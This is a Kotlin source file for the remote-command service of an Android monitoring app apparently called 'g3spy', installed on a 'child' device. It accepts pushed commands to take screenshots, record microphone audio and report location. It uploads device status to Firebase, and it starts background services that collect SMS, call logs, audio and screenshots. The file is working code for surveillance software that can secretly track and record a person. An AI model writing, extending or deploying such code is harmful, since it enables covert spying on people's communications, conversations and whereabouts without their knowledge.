package com.g3spy.child.services

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.messaging.FirebaseMessagingService as FirebaseMsgService
import com.google.firebase.messaging.RemoteMessage
import java.util.Date

/**
 * Service to handle Firebase Cloud Messaging for remote commands
 */
class MyFirebaseMessagingService : FirebaseMsgService() {

    companion object {
        private const val TAG = "FCMService"
    }
    
    override fun onCreate() {
        super.onCreate()
        
        // Send device status update when service initializes
        sendDeviceStatusUpdate()
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "From: ${remoteMessage.from}")

        // Process data payload
        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "Message data payload: ${remoteMessage.data}")
            
            // Check for command type
            when (remoteMessage.data["command"]) {
                "SCREENSHOT" -> {
                    Log.d(TAG, "Received screenshot command")
                    triggerScreenshot()
                }
                "AUDIO_RECORD" -> {
                    Log.d(TAG, "Received audio recording command")
                    val duration = remoteMessage.data["duration"]?.toLongOrNull() ?: 60000L
                    triggerAudioRecording(duration)
                }
                "LOCATION_UPDATE" -> {
                    Log.d(TAG, "Received location update command")
                    triggerLocationUpdate()
                }
                "DEVICE_STATUS" -> {
                    Log.d(TAG, "Received device status update command")
                    sendDeviceStatusUpdate()
                }
                "START_SERVICES" -> {
                    Log.d(TAG, "Received start services command")
                    startAllServices()
                }
                else -> {
                    Log.d(TAG, "Unknown command received")
                }
            }
        }
    }

    override fun onNewToken(token: String) {
        Log.d(TAG, "Refreshed token: $token")
        
        // Send the new token to Firestore for parent app to use
        val tokenData = hashMapOf(
            "token" to token,
            "timestamp" to Timestamp.now(),
            "device" to "child"
        )
        
        FirebaseFirestore.getInstance().collection("device_tokens")
            .add(tokenData)
            .addOnSuccessListener {
                Log.d(TAG, "Token successfully uploaded")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading token", e)
            }
    }
    
    private fun triggerScreenshot() {
        // Create a remote command in Firestore to trigger screenshot
        val command = hashMapOf(
            "command" to "SCREENSHOT",
            "params" to mapOf<String, Any>(),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        FirebaseFirestore.getInstance().collection("remote_commands")
            .add(command)
            .addOnSuccessListener {
                Log.d(TAG, "Screenshot command added to Firestore")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error adding screenshot command", e)
            }
    }
    
    private fun triggerAudioRecording(durationMs: Long) {
        // Create a remote command in Firestore to trigger audio recording
        val command = hashMapOf(
            "command" to "AUDIO_RECORD",
            "params" to mapOf(
                "durationMs" to durationMs
            ),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        FirebaseFirestore.getInstance().collection("remote_commands")
            .add(command)
            .addOnSuccessListener {
                Log.d(TAG, "Audio recording command added to Firestore")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error adding audio recording command", e)
            }
    }
    
    private fun triggerLocationUpdate() {
        // Create a remote command in Firestore to trigger location update
        val command = hashMapOf(
            "command" to "LOCATION_UPDATE",
            "params" to mapOf<String, Any>(),
            "timestamp" to Timestamp.now(),
            "isExecuted" to false
        )
        
        FirebaseFirestore.getInstance().collection("remote_commands")
            .add(command)
            .addOnSuccessListener {
                Log.d(TAG, "Location update command added to Firestore")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error adding location update command", e)
            }
    }
    
    private fun sendDeviceStatusUpdate() {
        // Get battery info
        val batteryIntent = this.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val batteryLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val batteryScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPercentage = if (batteryScale > 0) (batteryLevel * 100 / batteryScale) else -1
        val isCharging = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0 > 0
        
        // Create device status update
        val statusData = hashMapOf(
            "batteryLevel" to batteryPercentage,
            "isCharging" to isCharging,
            "availableStorage" to getAvailableStorage(),
            "deviceModel" to Build.MODEL,
            "androidVersion" to Build.VERSION.RELEASE,
            "lastConnectionTime" to Timestamp.now(),
            "isNetworkAvailable" to true,
            "activeApp" to "Unknown" // In a real app, would determine current foreground app
        )
        
        FirebaseFirestore.getInstance().collection("device_status")
            .add(statusData)
            .addOnSuccessListener {
                Log.d(TAG, "Device status uploaded successfully")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading device status", e)
            }
    }
    
    private fun getAvailableStorage(): Long {
        val stat = android.os.StatFs(applicationContext.filesDir.path)
        return stat.availableBlocksLong * stat.blockSizeLong
    }
    
    private fun startAllServices() {
        // Start all the monitoring services
        startService(Intent(this, LocationService::class.java))
        startService(Intent(this, SmsService::class.java))
        startService(Intent(this, CallLogService::class.java))
        startService(Intent(this, MicRecordingService::class.java))
        startService(Intent(this, ScreenshotService::class.java))
        
        Log.d(TAG, "All services started")
    }
}
